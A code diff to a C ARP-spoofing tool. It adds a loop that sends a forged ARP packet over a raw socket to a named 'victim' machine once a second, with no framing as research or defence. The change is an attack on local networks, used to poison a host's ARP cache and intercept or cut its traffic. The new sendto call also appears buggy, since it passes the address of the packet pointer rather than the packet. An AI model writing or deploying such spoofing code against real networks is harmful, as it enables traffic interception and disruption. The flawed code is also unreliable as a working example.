@@ -12,6 +12,8 @@
 #include <string.h>
 #include <netinet/ether.h>
 #include <unistd.h>
+#include <stdbool.h>
+#include <arpa/inet.h>
 #include "arpspoof.h"
 
 static void print_mac_address(uint8_t mac[ETH_ALEN])
@@ -24,11 +26,24 @@ static void print_mac_address(uint8_t mac[ETH_ALEN])
     }
 }
 
-static void send_packet(arp_packet_t *packet)
+static void send_packet(arp_packet_t *packet, arp_t *arp)
 {
+    int sock = create_socket();
+    struct sockaddr_ll dest_addr = create_dest_address(sock, arp->iface);
+    socklen_t addr_size = sizeof(struct sockaddr_ll);
+
+    memcpy(dest_addr.sll_addr, packet->eth_hdr.ether_dhost, ETH_ALEN);
     printf("Found victim’s MAC address: '");
     print_mac_address(packet->eth_hdr.ether_dhost);
     printf("'\n");
+    while (true) {
+        if (sendto(sock, &packet, sizeof(arp_packet_t), 0,
+                (struct sockaddr *) &dest_addr, addr_size) == -1) {
+            perror("sendto");
+        }
+        printf("Spoofed packet sent to '%s'\n", arp->dest_ip);
+        sleep(1);
+    }
 }
 
 int arp_spoof(arp_t *arp)
@@ -40,7 +55,7 @@ int arp_spoof(arp_t *arp)
     memcpy(packet.eth_hdr.ether_dhost, mac, ETH_ALEN);
     memcpy(packet.eth_arp.arp_tha, mac, ETH_ALEN);
     free(mac);
-    send_packet(&packet);
+    send_packet(&packet, arp);
     return 0;
 }
 
